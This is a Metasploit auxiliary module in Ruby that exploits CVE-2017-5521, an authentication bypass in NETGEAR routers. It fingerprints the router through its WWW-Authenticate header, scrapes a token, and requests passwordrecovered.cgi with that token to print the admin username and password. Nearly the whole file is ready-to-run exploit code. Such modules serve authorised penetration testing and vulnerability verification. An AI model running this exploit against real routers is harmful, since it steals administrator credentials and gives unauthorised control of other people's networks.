##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'NETGEAR Administrator Password Disclosure',
      'Description'    => %q{
        This module will collect the password for the `admin` user.
        The exploit will not complete if password recovery is set on the router.
        The password is recieved by passing the token generated from `unauth.cgi`
        to `passwordrecovered.cgi`. This exploit works on many different NETGEAR
        products. The full list of affected productsis available here:
        http://pastebin.com/dB4bTgxz
      },
      'Author'         =>
        [
          'Simon Kenin', # Vuln Discovery, PoC
          'thecarterb'   # Metasploit module
        ],
      'References'     =>
        [
          [ 'CVE', '2017-5521' ],
          [ 'URL', 'https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2017-003/?fid=8911' ],
          [ 'URL', 'http://thehackernews.com/2017/01/Netgear-router-password-hacking.html'],
          [ 'URL', 'https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2017-5521--Bypassing-Authentication-on-NETGEAR-Routers/'],
          [ 'EDB', '41205']
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
    [
      OptPort::new('RPORT', [true, 'The port to connect to RHOST with', 80]),
      OptString::new('RHOST', [true, 'The router target ip address', nil]),
      OptString::new('TARGETURI', [true, 'The base path to the vulnerable application', '/'])
    ], self.class)
  end

  # @return substring of 'text', usually a response from a server in this case
  def scrape(text, start_trig, end_trig)
    text[/#{start_trig}(.*?)#{end_trig}/m, 1]
  end

  def run
    rhost = datastore['RHOST']
    uri = target_uri.path
    uri = normalize_uri(uri)
    print_status("Checking if #{rhost} is a NETGEAR router")
    vprint_status("Sending request to http://#{rhost}/")

    # will always call check no matter what
    is_ng = check

    res = send_request_cgi({ 'uri' => uri })
    if res.nil?
      print_error("#{rhost} returned an empty response.")
      return
    end

    if is_ng == Exploit::CheckCode::Detected
      marker_one = "id="
      marker_two = "\""
      token = scrape(res.to_s, marker_one, marker_two)
      if token.nil?
        print_error("#{rhost} is not vulnerable: Token not found")
        return
      end
      print_status("Token found: #{token}")
      vprint_status("Token found at #{rhost}/unauth.cgi?id=#{token}")
      r = send_request_cgi({
        'uri' => "/passwordrecovered.cgi",
        'vars_get' => "id=#{token}"})
      vprint_status("Sending request to #{rhost}/passwordrecovered.cgi?id=#{token}")
      if r.to_s.include?('left">')
        username = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Username</td><td class=\"MNUText\" align=\"left\">", "</td>")
        password = scrape(r.to_s, "<td class=\"MNUText\" align=\"right\">Router Admin Password</td><td class=\"MNUText\" align=\"left\">", "</td>")
        if username == "" || password == ""
          print_error("No Creds found")
        else
          print_good("Creds found: #{username}/#{password}")
        end
      else
        print_error("#{rhost} is not vulnerable because password recovery is on.")
      end
    else
      print_error("#{rhost} is not vulnerable: Not a NETGEAR device")
      return
    end
  end

  #Almost every NETGEAR router sends a 'WWW-Authenticate' header in the response
  #This checks the response dor that header.
  def check                             #NOTE: this is working
    res = send_request_cgi({'uri'=>'/'})
    unless res
      fail_with(Failure::Unreachable, 'Connection timed out.')
    end

    if res.nil?
      print_erro("#{rhost} returned an empty response")
      return
    else
      data = res.to_s
      # Checks for the `WWW-Authenticate` header in the response
      if data.include? "WWW-Authenticate"
        marker_one = "Basic realm=\""
        marker_two = "\""
        model = data[/#{marker_one}(.*?)#{marker_two}/m, 1]
        print_good("Router is a NETGEAR router (#{model})")
        return Exploit::CheckCode::Detected
      else
        print_error('Router is not a NETGEAR router')
        return Exploit::CheckCode::Safe
      end
    end
  end
end
